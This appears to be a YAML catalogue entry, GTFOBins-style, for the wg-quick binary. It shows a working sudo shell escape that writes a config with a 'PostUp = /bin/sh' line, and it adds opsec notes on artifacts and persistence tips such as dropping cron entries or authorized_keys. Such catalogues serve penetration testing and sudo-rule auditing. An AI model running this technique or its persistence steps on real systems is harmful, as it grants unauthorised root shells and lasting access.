---
name: wg-quick
capabilities:
- exec
- spawn
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    cat >/path/to/temp-file.conf <<EOF
    [Interface]
    PostUp = /bin/sh
    EOF

    wg-quick up /path/to/temp-file.conf
  notes: Use `wg-quick down /path/to/temp-file.conf` in order to be able to run the shell again.
references:
- https://gtfobins.github.io/gtfobins/wg-quick/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
